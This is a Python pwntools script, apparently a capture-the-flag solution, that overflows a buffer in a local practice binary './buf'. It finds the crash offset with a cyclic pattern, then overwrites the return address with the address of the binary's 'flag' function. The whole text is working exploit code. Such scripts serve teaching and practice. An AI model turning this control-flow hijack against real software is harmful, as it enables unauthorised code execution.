#!/usr/bin/env python2
from __future__ import print_function

import sys

from pwn import *
context.binary = './buf'
context.terminal = ['tmux', 'splitw', '-v']

if len(sys.argv) > 1:
    p = gdb.debug('./buf')
    pause()
    p.sendline(cyclic(512))
    pause()
    # look at bus error
    sys.exit()

elf = ELF('./buf')
exploit = cyclic(cyclic_find(0x6161616b))
exploit += p64(elf.symbols[u'flag'])

p = process('./buf')
p.sendline(exploit)
p.recvline()
print(p.recvline(), end='')
